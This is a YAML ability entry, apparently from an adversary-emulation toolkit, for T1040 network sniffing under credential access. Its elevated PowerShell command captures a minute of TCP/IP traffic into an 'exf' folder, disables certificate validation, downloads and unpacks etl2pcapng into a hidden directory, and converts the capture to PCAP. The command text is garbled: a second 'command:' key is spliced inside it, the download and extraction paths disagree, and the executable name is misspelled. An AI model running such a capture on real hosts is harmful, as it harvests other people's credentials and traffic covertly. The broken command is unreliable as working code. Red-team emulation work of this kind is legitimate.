- tactic: credential-access
  singleton: false
  technique_name: Network Sniffing
  description: Packet capture generates etl file, download etl2pcapng from GitHub
    and convert the ETL to PCAP
  repeatable: false
  plugin: ''
  requirements: []
  executors:
  - cleanup: []
    variations: []
    language: null
    uploads: []
    platform: windows
    name: psh
    build_target: null
    payloads: []
    command: "$path = \"$env:PUBLIC\\exf\\capture.etl\";\nNew-NetEventSession -Name\
      \ \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider\
      \ -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession\
      \ -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\n\
      if (Test-Path $path) {\n  echo $path;\ncommand: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
      \ { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"\
      https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\"\
      ,\n      \"etl2pcapng.zip\");\n      New-Item -ItemType \"directory\" $env:PUBLIC\\\
      etl2pcapng -Force;\n      $psdir=Get-Item \"$env:PUBLIC\\etl2pcapng\" -Force;\n\
      \      $psdir.attributes=\"hidden\";\n      Add-Type -Assembly ''System.IO.Compression.FileSystem'';\
      \ [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\etl2pcapng\\\
      etl2pcapng.zip\",\n      \"$env:PUBLIC\\etl2pcapng\");'\n$env:PUBLIC\\etl2pcapng\\\
      etl2pcapng\\x86\\etl2etlpcapng.exe $env:PUBLIC\\exf\\capture.etl $env:PUBLIC\\\
      exf\\capture.pcap  \nexit 0;\n} else {\n  echo \"Failed to generate PCAP file.\"\
      ;\n  exit 1;\n};"
    timeout: 90
    code: null
    parsers: []
    additional_info: {}
  name: Sniff network traffic and convert etl to pcap file using etl2pcapng
  privilege: Elevated
  buckets:
  - credential-access
  additional_info: {}
  delete_payload: true
  access: {}
  technique_id: T1040
  id: packet_capture_pcap_file
